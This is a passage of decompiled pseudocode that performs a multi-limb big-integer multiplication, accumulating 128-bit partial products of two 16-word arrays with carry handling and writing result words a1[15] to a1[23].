  *((_QWORD *)&v487 + 1) += v484 + (unsigned __int64)v487 < v484;
  v489 = *((_QWORD *)&v487 + 1) + v485;
  v490 = (v489 < *((_QWORD *)&v487 + 1)) + v486;
  v491 = a2[7] * (unsigned __int128)a3[8];
  v492 = v488 + v491;
  *((_QWORD *)&v491 + 1) += v488 + (unsigned __int64)v491 < v488;
  v493 = *((_QWORD *)&v491 + 1) + v489;
  v494 = (v493 < *((_QWORD *)&v491 + 1)) + v490;
  v495 = a2[8] * (unsigned __int128)a3[7];
  v496 = v492 + v495;
  *((_QWORD *)&v495 + 1) += v492 + (unsigned __int64)v495 < v492;
  v497 = *((_QWORD *)&v495 + 1) + v493;
  v498 = (v497 < *((_QWORD *)&v495 + 1)) + v494;
  v499 = a2[9] * (unsigned __int128)a3[6];
  v500 = v496 + v499;
  *((_QWORD *)&v499 + 1) += v496 + (unsigned __int64)v499 < v496;
  v501 = *((_QWORD *)&v499 + 1) + v497;
  v502 = (v501 < *((_QWORD *)&v499 + 1)) + v498;
  v503 = a2[10] * (unsigned __int128)a3[5];
  v504 = v500 + v503;
  *((_QWORD *)&v503 + 1) += v500 + (unsigned __int64)v503 < v500;
  v505 = *((_QWORD *)&v503 + 1) + v501;
  v506 = (v505 < *((_QWORD *)&v503 + 1)) + v502;
  v507 = a2[11] * (unsigned __int128)a3[4];
  v508 = v504 + v507;
  *((_QWORD *)&v507 + 1) += v504 + (unsigned __int64)v507 < v504;
  v509 = *((_QWORD *)&v507 + 1) + v505;
  v510 = (v509 < *((_QWORD *)&v507 + 1)) + v506;
  v511 = a2[12] * (unsigned __int128)a3[3];
  v512 = v508 + v511;
  *((_QWORD *)&v511 + 1) += v508 + (unsigned __int64)v511 < v508;
  v513 = *((_QWORD *)&v511 + 1) + v509;
  v514 = (v513 < *((_QWORD *)&v511 + 1)) + v510;
  v515 = a2[13] * (unsigned __int128)a3[2];
  v516 = v512 + v515;
  *((_QWORD *)&v515 + 1) += v512 + (unsigned __int64)v515 < v512;
  v517 = *((_QWORD *)&v515 + 1) + v513;
  v518 = (v517 < *((_QWORD *)&v515 + 1)) + v514;
  v519 = a2[14] * (unsigned __int128)a3[1];
  v520 = v516 + v519;
  *((_QWORD *)&v519 + 1) += v516 + (unsigned __int64)v519 < v516;
  v521 = *((_QWORD *)&v519 + 1) + v517;
  v522 = (v521 < *((_QWORD *)&v519 + 1)) + v518;
  v523 = a2[15] * (unsigned __int128)*a3;
  *(_QWORD *)&v523 = v520 + v523;
  a1[15] = v523;
  *((_QWORD *)&v523 + 1) += (unsigned __int64)v523 < v520;
  v524 = *((_QWORD *)&v523 + 1) + v521;
  v525 = (v524 < *((_QWORD *)&v523 + 1)) + v522;
  v526 = a2[1] * (unsigned __int128)a3[15];
  v527 = v524 + v526;
  *((_QWORD *)&v526 + 1) += v524 + (unsigned __int64)v526 < v524;
  v528 = *((_QWORD *)&v526 + 1) + v525;
  v529 = v528 < *((_QWORD *)&v526 + 1);
  v530 = a2[2] * (unsigned __int128)a3[14];
  v531 = v527 + v530;
  *((_QWORD *)&v530 + 1) += v527 + (unsigned __int64)v530 < v527;
  v532 = *((_QWORD *)&v530 + 1) + v528;
  v533 = (v532 < *((_QWORD *)&v530 + 1)) + v529;
  v534 = a2[3] * (unsigned __int128)a3[13];
  v535 = v531 + v534;
  *((_QWORD *)&v534 + 1) += v531 + (unsigned __int64)v534 < v531;
  v536 = *((_QWORD *)&v534 + 1) + v532;
  v537 = (v536 < *((_QWORD *)&v534 + 1)) + v533;
  v538 = a2[4] * (unsigned __int128)a3[12];
  v539 = v535 + v538;
  *((_QWORD *)&v538 + 1) += v535 + (unsigned __int64)v538 < v535;
  v540 = *((_QWORD *)&v538 + 1) + v536;
  v541 = (v540 < *((_QWORD *)&v538 + 1)) + v537;
  v542 = a2[5] * (unsigned __int128)a3[11];
  v543 = v539 + v542;
  *((_QWORD *)&v542 + 1) += v539 + (unsigned __int64)v542 < v539;
  v544 = *((_QWORD *)&v542 + 1) + v540;
  v545 = (v544 < *((_QWORD *)&v542 + 1)) + v541;
  v546 = a2[6] * (unsigned __int128)a3[10];
  v547 = v543 + v546;
  *((_QWORD *)&v546 + 1) += v543 + (unsigned __int64)v546 < v543;
  v548 = *((_QWORD *)&v546 + 1) + v544;
  v549 = (v548 < *((_QWORD *)&v546 + 1)) + v545;
  v550 = a2[7] * (unsigned __int128)a3[9];
  v551 = v547 + v550;
  *((_QWORD *)&v550 + 1) += v547 + (unsigned __int64)v550 < v547;
  v552 = *((_QWORD *)&v550 + 1) + v548;
  v553 = (v552 < *((_QWORD *)&v550 + 1)) + v549;
  v554 = a2[8] * (unsigned __int128)a3[8];
  v555 = v551 + v554;
  *((_QWORD *)&v554 + 1) += v551 + (unsigned __int64)v554 < v551;
  v556 = *((_QWORD *)&v554 + 1) + v552;
  v557 = (v556 < *((_QWORD *)&v554 + 1)) + v553;
  v558 = a2[9] * (unsigned __int128)a3[7];
  v559 = v555 + v558;
  *((_QWORD *)&v558 + 1) += v555 + (unsigned __int64)v558 < v555;
  v560 = *((_QWORD *)&v558 + 1) + v556;
  v561 = (v560 < *((_QWORD *)&v558 + 1)) + v557;
  v562 = a2[10] * (unsigned __int128)a3[6];
  v563 = v559 + v562;
  *((_QWORD *)&v562 + 1) += v559 + (unsigned __int64)v562 < v559;
  v564 = *((_QWORD *)&v562 + 1) + v560;
  v565 = (v564 < *((_QWORD *)&v562 + 1)) + v561;
  v566 = a2[11] * (unsigned __int128)a3[5];
  v567 = v563 + v566;
  *((_QWORD *)&v566 + 1) += v563 + (unsigned __int64)v566 < v563;
  v568 = *((_QWORD *)&v566 + 1) + v564;
  v569 = (v568 < *((_QWORD *)&v566 + 1)) + v565;
  v570 = a2[12] * (unsigned __int128)a3[4];
  v571 = v567 + v570;
  *((_QWORD *)&v570 + 1) += v567 + (unsigned __int64)v570 < v567;
  v572 = *((_QWORD *)&v570 + 1) + v568;
  v573 = (v572 < *((_QWORD *)&v570 + 1)) + v569;
  v574 = a2[13] * (unsigned __int128)a3[3];
  v575 = v571 + v574;
  *((_QWORD *)&v574 + 1) += v571 + (unsigned __int64)v574 < v571;
  v576 = *((_QWORD *)&v574 + 1) + v572;
  v577 = (v576 < *((_QWORD *)&v574 + 1)) + v573;
  v578 = a2[14] * (unsigned __int128)a3[2];
  v579 = v575 + v578;
  *((_QWORD *)&v578 + 1) += v575 + (unsigned __int64)v578 < v575;
  v580 = *((_QWORD *)&v578 + 1) + v576;
  v581 = (v580 < *((_QWORD *)&v578 + 1)) + v577;
  v582 = a2[15] * (unsigned __int128)a3[1];
  *(_QWORD *)&v582 = v579 + v582;
  a1[16] = v582;
  *((_QWORD *)&v582 + 1) += (unsigned __int64)v582 < v579;
  v583 = *((_QWORD *)&v582 + 1) + v580;
  v584 = (v583 < *((_QWORD *)&v582 + 1)) + v581;
  v585 = a2[2] * (unsigned __int128)a3[15];
  v586 = v583 + v585;
  *((_QWORD *)&v585 + 1) += v583 + (unsigned __int64)v585 < v583;
  v587 = *((_QWORD *)&v585 + 1) + v584;
  v588 = v587 < *((_QWORD *)&v585 + 1);
  v589 = a2[3] * (unsigned __int128)a3[14];
  v590 = v586 + v589;
  *((_QWORD *)&v589 + 1) += v586 + (unsigned __int64)v589 < v586;
  v591 = *((_QWORD *)&v589 + 1) + v587;
  v592 = (v591 < *((_QWORD *)&v589 + 1)) + v588;
  v593 = a2[4] * (unsigned __int128)a3[13];
  v594 = v590 + v593;
  *((_QWORD *)&v593 + 1) += v590 + (unsigned __int64)v593 < v590;
  v595 = *((_QWORD *)&v593 + 1) + v591;
  v596 = (v595 < *((_QWORD *)&v593 + 1)) + v592;
  v597 = a2[5] * (unsigned __int128)a3[12];
  v598 = v594 + v597;
  *((_QWORD *)&v597 + 1) += v594 + (unsigned __int64)v597 < v594;
  v599 = *((_QWORD *)&v597 + 1) + v595;
  v600 = (v599 < *((_QWORD *)&v597 + 1)) + v596;
  v601 = a2[6] * (unsigned __int128)a3[11];
  v602 = v598 + v601;
  *((_QWORD *)&v601 + 1) += v598 + (unsigned __int64)v601 < v598;
  v603 = *((_QWORD *)&v601 + 1) + v599;
  v604 = (v603 < *((_QWORD *)&v601 + 1)) + v600;
  v605 = a2[7] * (unsigned __int128)a3[10];
  v606 = v602 + v605;
  *((_QWORD *)&v605 + 1) += v602 + (unsigned __int64)v605 < v602;
  v607 = *((_QWORD *)&v605 + 1) + v603;
  v608 = (v607 < *((_QWORD *)&v605 + 1)) + v604;
  v609 = a2[8] * (unsigned __int128)a3[9];
  v610 = v606 + v609;
  *((_QWORD *)&v609 + 1) += v606 + (unsigned __int64)v609 < v606;
  v611 = *((_QWORD *)&v609 + 1) + v607;
  v612 = (v611 < *((_QWORD *)&v609 + 1)) + v608;
  v613 = a2[9] * (unsigned __int128)a3[8];
  v614 = v610 + v613;
  *((_QWORD *)&v613 + 1) += v610 + (unsigned __int64)v613 < v610;
  v615 = *((_QWORD *)&v613 + 1) + v611;
  v616 = (v615 < *((_QWORD *)&v613 + 1)) + v612;
  v617 = a2[10] * (unsigned __int128)a3[7];
  v618 = v614 + v617;
  *((_QWORD *)&v617 + 1) += v614 + (unsigned __int64)v617 < v614;
  v619 = *((_QWORD *)&v617 + 1) + v615;
  v620 = (v619 < *((_QWORD *)&v617 + 1)) + v616;
  v621 = a2[11] * (unsigned __int128)a3[6];
  v622 = v618 + v621;
  *((_QWORD *)&v621 + 1) += v618 + (unsigned __int64)v621 < v618;
  v623 = *((_QWORD *)&v621 + 1) + v619;
  v624 = (v623 < *((_QWORD *)&v621 + 1)) + v620;
  v625 = a2[12] * (unsigned __int128)a3[5];
  v626 = v622 + v625;
  *((_QWORD *)&v625 + 1) += v622 + (unsigned __int64)v625 < v622;
  v627 = *((_QWORD *)&v625 + 1) + v623;
  v628 = (v627 < *((_QWORD *)&v625 + 1)) + v624;
  v629 = a2[13] * (unsigned __int128)a3[4];
  v630 = v626 + v629;
  *((_QWORD *)&v629 + 1) += v626 + (unsigned __int64)v629 < v626;
  v631 = *((_QWORD *)&v629 + 1) + v627;
  v632 = (v631 < *((_QWORD *)&v629 + 1)) + v628;
  v633 = a2[14] * (unsigned __int128)a3[3];
  v634 = v630 + v633;
  *((_QWORD *)&v633 + 1) += v630 + (unsigned __int64)v633 < v630;
  v635 = *((_QWORD *)&v633 + 1) + v631;
  v636 = (v635 < *((_QWORD *)&v633 + 1)) + v632;
  v637 = a2[15] * (unsigned __int128)a3[2];
  *(_QWORD *)&v637 = v634 + v637;
  a1[17] = v637;
  *((_QWORD *)&v637 + 1) += (unsigned __int64)v637 < v634;
  v638 = *((_QWORD *)&v637 + 1) + v635;
  v639 = (v638 < *((_QWORD *)&v637 + 1)) + v636;
  v640 = a2[3] * (unsigned __int128)a3[15];
  v641 = v638 + v640;
  *((_QWORD *)&v640 + 1) += v638 + (unsigned __int64)v640 < v638;
  v642 = *((_QWORD *)&v640 + 1) + v639;
  v643 = v642 < *((_QWORD *)&v640 + 1);
  v644 = a2[4] * (unsigned __int128)a3[14];
  v645 = v641 + v644;
  *((_QWORD *)&v644 + 1) += v641 + (unsigned __int64)v644 < v641;
  v646 = *((_QWORD *)&v644 + 1) + v642;
  v647 = (v646 < *((_QWORD *)&v644 + 1)) + v643;
  v648 = a2[5] * (unsigned __int128)a3[13];
  v649 = v645 + v648;
  *((_QWORD *)&v648 + 1) += v645 + (unsigned __int64)v648 < v645;
  v650 = *((_QWORD *)&v648 + 1) + v646;
  v651 = (v650 < *((_QWORD *)&v648 + 1)) + v647;
  v652 = a2[6] * (unsigned __int128)a3[12];
  v653 = v649 + v652;
  *((_QWORD *)&v652 + 1) += v649 + (unsigned __int64)v652 < v649;
  v654 = *((_QWORD *)&v652 + 1) + v650;
  v655 = (v654 < *((_QWORD *)&v652 + 1)) + v651;
  v656 = a2[7] * (unsigned __int128)a3[11];
  v657 = v653 + v656;
  *((_QWORD *)&v656 + 1) += v653 + (unsigned __int64)v656 < v653;
  v658 = *((_QWORD *)&v656 + 1) + v654;
  v659 = (v658 < *((_QWORD *)&v656 + 1)) + v655;
  v660 = a2[8] * (unsigned __int128)a3[10];
  v661 = v657 + v660;
  *((_QWORD *)&v660 + 1) += v657 + (unsigned __int64)v660 < v657;
  v662 = *((_QWORD *)&v660 + 1) + v658;
  v663 = (v662 < *((_QWORD *)&v660 + 1)) + v659;
  v664 = a2[9] * (unsigned __int128)a3[9];
  v665 = v661 + v664;
  *((_QWORD *)&v664 + 1) += v661 + (unsigned __int64)v664 < v661;
  v666 = *((_QWORD *)&v664 + 1) + v662;
  v667 = (v666 < *((_QWORD *)&v664 + 1)) + v663;
  v668 = a2[10] * (unsigned __int128)a3[8];
  v669 = v665 + v668;
  *((_QWORD *)&v668 + 1) += v665 + (unsigned __int64)v668 < v665;
  v670 = *((_QWORD *)&v668 + 1) + v666;
  v671 = (v670 < *((_QWORD *)&v668 + 1)) + v667;
  v672 = a2[11] * (unsigned __int128)a3[7];
  v673 = v669 + v672;
  *((_QWORD *)&v672 + 1) += v669 + (unsigned __int64)v672 < v669;
  v674 = *((_QWORD *)&v672 + 1) + v670;
  v675 = (v674 < *((_QWORD *)&v672 + 1)) + v671;
  v676 = a2[12] * (unsigned __int128)a3[6];
  v677 = v673 + v676;
  *((_QWORD *)&v676 + 1) += v673 + (unsigned __int64)v676 < v673;
  v678 = *((_QWORD *)&v676 + 1) + v674;
  v679 = (v678 < *((_QWORD *)&v676 + 1)) + v675;
  v680 = a2[13] * (unsigned __int128)a3[5];
  v681 = v677 + v680;
  *((_QWORD *)&v680 + 1) += v677 + (unsigned __int64)v680 < v677;
  v682 = *((_QWORD *)&v680 + 1) + v678;
  v683 = (v682 < *((_QWORD *)&v680 + 1)) + v679;
  v684 = a2[14] * (unsigned __int128)a3[4];
  v685 = v681 + v684;
  *((_QWORD *)&v684 + 1) += v681 + (unsigned __int64)v684 < v681;
  v686 = *((_QWORD *)&v684 + 1) + v682;
  v687 = (v686 < *((_QWORD *)&v684 + 1)) + v683;
  v688 = a2[15] * (unsigned __int128)a3[3];
  *(_QWORD *)&v688 = v685 + v688;
  a1[18] = v688;
  *((_QWORD *)&v688 + 1) += (unsigned __int64)v688 < v685;
  v689 = *((_QWORD *)&v688 + 1) + v686;
  v690 = (v689 < *((_QWORD *)&v688 + 1)) + v687;
  v691 = a2[4] * (unsigned __int128)a3[15];
  v692 = v689 + v691;
  *((_QWORD *)&v691 + 1) += v689 + (unsigned __int64)v691 < v689;
  v693 = *((_QWORD *)&v691 + 1) + v690;
  v694 = v693 < *((_QWORD *)&v691 + 1);
  v695 = a2[5] * (unsigned __int128)a3[14];
  v696 = v692 + v695;
  *((_QWORD *)&v695 + 1) += v692 + (unsigned __int64)v695 < v692;
  v697 = *((_QWORD *)&v695 + 1) + v693;
  v698 = (v697 < *((_QWORD *)&v695 + 1)) + v694;
  v699 = a2[6] * (unsigned __int128)a3[13];
  v700 = v696 + v699;
  *((_QWORD *)&v699 + 1) += v696 + (unsigned __int64)v699 < v696;
  v701 = *((_QWORD *)&v699 + 1) + v697;
  v702 = (v701 < *((_QWORD *)&v699 + 1)) + v698;
  v703 = a2[7] * (unsigned __int128)a3[12];
  v704 = v700 + v703;
  *((_QWORD *)&v703 + 1) += v700 + (unsigned __int64)v703 < v700;
  v705 = *((_QWORD *)&v703 + 1) + v701;
  v706 = (v705 < *((_QWORD *)&v703 + 1)) + v702;
  v707 = a2[8] * (unsigned __int128)a3[11];
  v708 = v704 + v707;
  *((_QWORD *)&v707 + 1) += v704 + (unsigned __int64)v707 < v704;
  v709 = *((_QWORD *)&v707 + 1) + v705;
  v710 = (v709 < *((_QWORD *)&v707 + 1)) + v706;
  v711 = a2[9] * (unsigned __int128)a3[10];
  v712 = v708 + v711;
  *((_QWORD *)&v711 + 1) += v708 + (unsigned __int64)v711 < v708;
  v713 = *((_QWORD *)&v711 + 1) + v709;
  v714 = (v713 < *((_QWORD *)&v711 + 1)) + v710;
  v715 = a2[10] * (unsigned __int128)a3[9];
  v716 = v712 + v715;
  *((_QWORD *)&v715 + 1) += v712 + (unsigned __int64)v715 < v712;
  v717 = *((_QWORD *)&v715 + 1) + v713;
  v718 = (v717 < *((_QWORD *)&v715 + 1)) + v714;
  v719 = a2[11] * (unsigned __int128)a3[8];
  v720 = v716 + v719;
  *((_QWORD *)&v719 + 1) += v716 + (unsigned __int64)v719 < v716;
  v721 = *((_QWORD *)&v719 + 1) + v717;
  v722 = (v721 < *((_QWORD *)&v719 + 1)) + v718;
  v723 = a2[12] * (unsigned __int128)a3[7];
  v724 = v720 + v723;
  *((_QWORD *)&v723 + 1) += v720 + (unsigned __int64)v723 < v720;
  v725 = *((_QWORD *)&v723 + 1) + v721;
  v726 = (v725 < *((_QWORD *)&v723 + 1)) + v722;
  v727 = a2[13] * (unsigned __int128)a3[6];
  v728 = v724 + v727;
  *((_QWORD *)&v727 + 1) += v724 + (unsigned __int64)v727 < v724;
  v729 = *((_QWORD *)&v727 + 1) + v725;
  v730 = (v729 < *((_QWORD *)&v727 + 1)) + v726;
  v731 = a2[14] * (unsigned __int128)a3[5];
  v732 = v728 + v731;
  *((_QWORD *)&v731 + 1) += v728 + (unsigned __int64)v731 < v728;
  v733 = *((_QWORD *)&v731 + 1) + v729;
  v734 = (v733 < *((_QWORD *)&v731 + 1)) + v730;
  v735 = a2[15] * (unsigned __int128)a3[4];
  *(_QWORD *)&v735 = v732 + v735;
  a1[19] = v735;
  *((_QWORD *)&v735 + 1) += (unsigned __int64)v735 < v732;
  v736 = *((_QWORD *)&v735 + 1) + v733;
  v737 = (v736 < *((_QWORD *)&v735 + 1)) + v734;
  v738 = a2[5] * (unsigned __int128)a3[15];
  v739 = v736 + v738;
  *((_QWORD *)&v738 + 1) += v736 + (unsigned __int64)v738 < v736;
  v740 = *((_QWORD *)&v738 + 1) + v737;
  v741 = v740 < *((_QWORD *)&v738 + 1);
  v742 = a2[6] * (unsigned __int128)a3[14];
  v743 = v739 + v742;
  *((_QWORD *)&v742 + 1) += v739 + (unsigned __int64)v742 < v739;
  v744 = *((_QWORD *)&v742 + 1) + v740;
  v745 = (v744 < *((_QWORD *)&v742 + 1)) + v741;
  v746 = a2[7] * (unsigned __int128)a3[13];
  v747 = v743 + v746;
  *((_QWORD *)&v746 + 1) += v743 + (unsigned __int64)v746 < v743;
  v748 = *((_QWORD *)&v746 + 1) + v744;
  v749 = (v748 < *((_QWORD *)&v746 + 1)) + v745;
  v750 = a2[8] * (unsigned __int128)a3[12];
  v751 = v747 + v750;
  *((_QWORD *)&v750 + 1) += v747 + (unsigned __int64)v750 < v747;
  v752 = *((_QWORD *)&v750 + 1) + v748;
  v753 = (v752 < *((_QWORD *)&v750 + 1)) + v749;
  v754 = a2[9] * (unsigned __int128)a3[11];
  v755 = v751 + v754;
  *((_QWORD *)&v754 + 1) += v751 + (unsigned __int64)v754 < v751;
  v756 = *((_QWORD *)&v754 + 1) + v752;
  v757 = (v756 < *((_QWORD *)&v754 + 1)) + v753;
  v758 = a2[10] * (unsigned __int128)a3[10];
  v759 = v755 + v758;
  *((_QWORD *)&v758 + 1) += v755 + (unsigned __int64)v758 < v755;
  v760 = *((_QWORD *)&v758 + 1) + v756;
  v761 = (v760 < *((_QWORD *)&v758 + 1)) + v757;
  v762 = a2[11] * (unsigned __int128)a3[9];
  v763 = v759 + v762;
  *((_QWORD *)&v762 + 1) += v759 + (unsigned __int64)v762 < v759;
  v764 = *((_QWORD *)&v762 + 1) + v760;
  v765 = (v764 < *((_QWORD *)&v762 + 1)) + v761;
  v766 = a2[12] * (unsigned __int128)a3[8];
  v767 = v763 + v766;
  *((_QWORD *)&v766 + 1) += v763 + (unsigned __int64)v766 < v763;
  v768 = *((_QWORD *)&v766 + 1) + v764;
  v769 = (v768 < *((_QWORD *)&v766 + 1)) + v765;
  v770 = a2[13] * (unsigned __int128)a3[7];
  v771 = v767 + v770;
  *((_QWORD *)&v770 + 1) += v767 + (unsigned __int64)v770 < v767;
  v772 = *((_QWORD *)&v770 + 1) + v768;
  v773 = (v772 < *((_QWORD *)&v770 + 1)) + v769;
  v774 = a2[14] * (unsigned __int128)a3[6];
  v775 = v771 + v774;
  *((_QWORD *)&v774 + 1) += v771 + (unsigned __int64)v774 < v771;
  v776 = *((_QWORD *)&v774 + 1) + v772;
  v777 = (v776 < *((_QWORD *)&v774 + 1)) + v773;
  v778 = a2[15] * (unsigned __int128)a3[5];
  *(_QWORD *)&v778 = v775 + v778;
  a1[20] = v778;
  *((_QWORD *)&v778 + 1) += (unsigned __int64)v778 < v775;
  v779 = *((_QWORD *)&v778 + 1) + v776;
  v780 = (v779 < *((_QWORD *)&v778 + 1)) + v777;
  v781 = a2[6] * (unsigned __int128)a3[15];
  v782 = v779 + v781;
  *((_QWORD *)&v781 + 1) += v779 + (unsigned __int64)v781 < v779;
  v783 = *((_QWORD *)&v781 + 1) + v780;
  v784 = v783 < *((_QWORD *)&v781 + 1);
  v785 = a2[7] * (unsigned __int128)a3[14];
  v786 = v782 + v785;
  *((_QWORD *)&v785 + 1) += v782 + (unsigned __int64)v785 < v782;
  v787 = *((_QWORD *)&v785 + 1) + v783;
  v788 = (v787 < *((_QWORD *)&v785 + 1)) + v784;
  v789 = a2[8] * (unsigned __int128)a3[13];
  v790 = v786 + v789;
  *((_QWORD *)&v789 + 1) += v786 + (unsigned __int64)v789 < v786;
  v791 = *((_QWORD *)&v789 + 1) + v787;
  v792 = (v791 < *((_QWORD *)&v789 + 1)) + v788;
  v793 = a2[9] * (unsigned __int128)a3[12];
  v794 = v790 + v793;
  *((_QWORD *)&v793 + 1) += v790 + (unsigned __int64)v793 < v790;
  v795 = *((_QWORD *)&v793 + 1) + v791;
  v796 = (v795 < *((_QWORD *)&v793 + 1)) + v792;
  v797 = a2[10] * (unsigned __int128)a3[11];
  v798 = v794 + v797;
  *((_QWORD *)&v797 + 1) += v794 + (unsigned __int64)v797 < v794;
  v799 = *((_QWORD *)&v797 + 1) + v795;
  v800 = (v799 < *((_QWORD *)&v797 + 1)) + v796;
  v801 = a2[11] * (unsigned __int128)a3[10];
  v802 = v798 + v801;
  *((_QWORD *)&v801 + 1) += v798 + (unsigned __int64)v801 < v798;
  v803 = *((_QWORD *)&v801 + 1) + v799;
  v804 = (v803 < *((_QWORD *)&v801 + 1)) + v800;
  v805 = a2[12] * (unsigned __int128)a3[9];
  v806 = v802 + v805;
  *((_QWORD *)&v805 + 1) += v802 + (unsigned __int64)v805 < v802;
  v807 = *((_QWORD *)&v805 + 1) + v803;
  v808 = (v807 < *((_QWORD *)&v805 + 1)) + v804;
  v809 = a2[13] * (unsigned __int128)a3[8];
  v810 = v806 + v809;
  *((_QWORD *)&v809 + 1) += v806 + (unsigned __int64)v809 < v806;
  v811 = *((_QWORD *)&v809 + 1) + v807;
  v812 = (v811 < *((_QWORD *)&v809 + 1)) + v808;
  v813 = a2[14] * (unsigned __int128)a3[7];
  v814 = v810 + v813;
  *((_QWORD *)&v813 + 1) += v810 + (unsigned __int64)v813 < v810;
  v815 = *((_QWORD *)&v813 + 1) + v811;
  v816 = (v815 < *((_QWORD *)&v813 + 1)) + v812;
  v817 = a2[15] * (unsigned __int128)a3[6];
  *(_QWORD *)&v817 = v814 + v817;
  a1[21] = v817;
  *((_QWORD *)&v817 + 1) += (unsigned __int64)v817 < v814;
  v818 = *((_QWORD *)&v817 + 1) + v815;
  v819 = (v818 < *((_QWORD *)&v817 + 1)) + v816;
  v820 = a2[7] * (unsigned __int128)a3[15];
  v821 = v818 + v820;
  *((_QWORD *)&v820 + 1) += v818 + (unsigned __int64)v820 < v818;
  v822 = *((_QWORD *)&v820 + 1) + v819;
  v823 = v822 < *((_QWORD *)&v820 + 1);
  v824 = a2[8] * (unsigned __int128)a3[14];
  v825 = v821 + v824;
  *((_QWORD *)&v824 + 1) += v821 + (unsigned __int64)v824 < v821;
  v826 = *((_QWORD *)&v824 + 1) + v822;
  v827 = (v826 < *((_QWORD *)&v824 + 1)) + v823;
  v828 = a2[9] * (unsigned __int128)a3[13];
  v829 = v825 + v828;
  *((_QWORD *)&v828 + 1) += v825 + (unsigned __int64)v828 < v825;
  v830 = *((_QWORD *)&v828 + 1) + v826;
  v831 = (v830 < *((_QWORD *)&v828 + 1)) + v827;
  v832 = a2[10] * (unsigned __int128)a3[12];
  v833 = v829 + v832;
  *((_QWORD *)&v832 + 1) += v829 + (unsigned __int64)v832 < v829;
  v834 = *((_QWORD *)&v832 + 1) + v830;
  v835 = (v834 < *((_QWORD *)&v832 + 1)) + v831;
  v836 = a2[11] * (unsigned __int128)a3[11];
  v837 = v833 + v836;
  *((_QWORD *)&v836 + 1) += v833 + (unsigned __int64)v836 < v833;
  v838 = *((_QWORD *)&v836 + 1) + v834;
  v839 = (v838 < *((_QWORD *)&v836 + 1)) + v835;
  v840 = a2[12] * (unsigned __int128)a3[10];
  v841 = v837 + v840;
  *((_QWORD *)&v840 + 1) += v837 + (unsigned __int64)v840 < v837;
  v842 = *((_QWORD *)&v840 + 1) + v838;
  v843 = (v842 < *((_QWORD *)&v840 + 1)) + v839;
  v844 = a2[13] * (unsigned __int128)a3[9];
  v845 = v841 + v844;
  *((_QWORD *)&v844 + 1) += v841 + (unsigned __int64)v844 < v841;
  v846 = *((_QWORD *)&v844 + 1) + v842;
  v847 = (v846 < *((_QWORD *)&v844 + 1)) + v843;
  v848 = a2[14] * (unsigned __int128)a3[8];
  v849 = v845 + v848;
  *((_QWORD *)&v848 + 1) += v845 + (unsigned __int64)v848 < v845;
  v850 = *((_QWORD *)&v848 + 1) + v846;
  v851 = (v850 < *((_QWORD *)&v848 + 1)) + v847;
  v852 = a2[15] * (unsigned __int128)a3[7];
  *(_QWORD *)&v852 = v849 + v852;
  a1[22] = v852;
  *((_QWORD *)&v852 + 1) += (unsigned __int64)v852 < v849;
  v853 = *((_QWORD *)&v852 + 1) + v850;
  v854 = (v853 < *((_QWORD *)&v852 + 1)) + v851;
  v855 = a2[8] * (unsigned __int128)a3[15];
  v856 = v853 + v855;
  *((_QWORD *)&v855 + 1) += v853 + (unsigned __int64)v855 < v853;
  v857 = *((_QWORD *)&v855 + 1) + v854;
  v858 = v857 < *((_QWORD *)&v855 + 1);
  v859 = a2[9] * (unsigned __int128)a3[14];
  v860 = v856 + v859;
  *((_QWORD *)&v859 + 1) += v856 + (unsigned __int64)v859 < v856;
  v861 = *((_QWORD *)&v859 + 1) + v857;
  v862 = (v861 < *((_QWORD *)&v859 + 1)) + v858;
  v863 = a2[10] * (unsigned __int128)a3[13];
  v864 = v860 + v863;
  *((_QWORD *)&v863 + 1) += v860 + (unsigned __int64)v863 < v860;
  v865 = *((_QWORD *)&v863 + 1) + v861;
  v866 = (v865 < *((_QWORD *)&v863 + 1)) + v862;
  v867 = a2[11] * (unsigned __int128)a3[12];
  v868 = v864 + v867;
  *((_QWORD *)&v867 + 1) += v864 + (unsigned __int64)v867 < v864;
  v869 = *((_QWORD *)&v867 + 1) + v865;
  v870 = (v869 < *((_QWORD *)&v867 + 1)) + v866;
  v871 = a2[12] * (unsigned __int128)a3[11];
  v872 = v868 + v871;
  *((_QWORD *)&v871 + 1) += v868 + (unsigned __int64)v871 < v868;
  v873 = *((_QWORD *)&v871 + 1) + v869;
  v874 = (v873 < *((_QWORD *)&v871 + 1)) + v870;
  v875 = a2[13] * (unsigned __int128)a3[10];
  v876 = v872 + v875;
  *((_QWORD *)&v875 + 1) += v872 + (unsigned __int64)v875 < v872;
  v877 = *((_QWORD *)&v875 + 1) + v873;
  v878 = (v877 < *((_QWORD *)&v875 + 1)) + v874;
  v879 = a2[14] * (unsigned __int128)a3[9];
  v880 = v876 + v879;
  *((_QWORD *)&v879 + 1) += v876 + (unsigned __int64)v879 < v876;
  v881 = *((_QWORD *)&v879 + 1) + v877;
  v882 = (v881 < *((_QWORD *)&v879 + 1)) + v878;
  v883 = a2[15] * (unsigned __int128)a3[8];
  *(_QWORD *)&v883 = v880 + v883;
  a1[23] = v883;
  *((_QWORD *)&v883 + 1) += (unsigned __int64)v883 < v880;
  v884 = *((_QWORD *)&v883 + 1) + v881;
  v885 = (v884 < *((_QWORD *)&v883 + 1)) + v882;
  v886 = a2[9] * (unsigned __int128)a3[15];
  v887 = v884 + v886;
  *((_QWORD *)&v886 + 1) += v884 + (unsigned __int64)v886 < v884;
  v888 = *((_QWORD *)&v886 + 1) + v885;
  v889 = v888 < *((_QWORD *)&v886 + 1);
  v890 = a2[10] * (unsigned __int128)a3[14];
  v891 = v887 + v890;
  *((_QWORD *)&v890 + 1) += v887 + (unsigned __int64)v890 < v887;
  v892 = *((_QWORD *)&v890 + 1) + v888;
  v893 = (v892 < *((_QWORD *)&v890 + 1)) + v889;
  v894 = a2[11] * (unsigned __int128)a3[13];
  v895 = v891 + v894;
  *((_QWORD *)&v894 + 1) += v891 + (unsigned __int64)v894 < v891;
  v896 = *((_QWORD *)&v894 + 1) + v892;
  v897 = (v896 < *((_QWORD *)&v894 + 1)) + v893;
  v898 = a2[12] * (unsigned __int128)a3[12];
  v899 = v895 + v898;
  *((_QWORD *)&v898 + 1) += v895 + (unsigned __int64)v898 < v895;
  v900 = *((_QWORD *)&v898 + 1) + v896;
  v901 = (v900 < *((_QWORD *)&v898 + 1)) + v897;
  v902 = a2[13] * (unsigned __int128)a3[11];
  v903 = v899 + v902;
  *((_QWORD *)&v902 + 1) += v899 + (unsigned __int64)v902 < v899;
  v904 = *((_QWORD *)&v902 + 1) + v900;
  v905 = (v904 < *((_QWORD *)&v902 + 1)) + v901;
  v906 = a2[14] * (unsigned __int128)a3[10];
  v907 = v903 + v906;
